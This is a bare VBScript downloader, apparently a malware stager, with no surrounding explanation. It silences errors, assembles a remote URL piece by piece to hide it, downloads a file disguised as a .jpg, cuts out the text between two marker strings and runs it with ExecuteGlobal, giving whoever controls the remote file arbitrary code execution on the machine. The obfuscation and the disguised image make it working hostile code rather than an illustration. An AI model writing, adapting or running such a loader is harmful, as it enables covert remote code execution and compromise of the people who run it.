On Error Resume Next

Dim addr, req, content, sTag, eTag, pStart, pEnd, payload

addr = "https" & "://" & _
       "raw" & "." & "githubusercontent" & "." & "com" & "/" & _
       "chotaacc" & "/" & _
       "newss" & "/" & _
       "main" & "/" & _
       "sb" & "." & "jpg"

sTag = "NotepadGO"
eTag = "NotepadEND"

Set req = CreateObject("MSXML2.ServerXMLHTTP.6.0")
req.Open "GET", addr, False
req.Send
If req.Status = 200 Then
    content = req.responseText
    pStart = InStr(content, sTag) + Len(sTag)
    pEnd = InStr(pStart, content, eTag)
    
    If pStart > Len(sTag) And pEnd > pStart Then
        payload = Mid(content, pStart, pEnd - pStart)
        ExecuteGlobal payload
    End If
End If
Set req = Nothing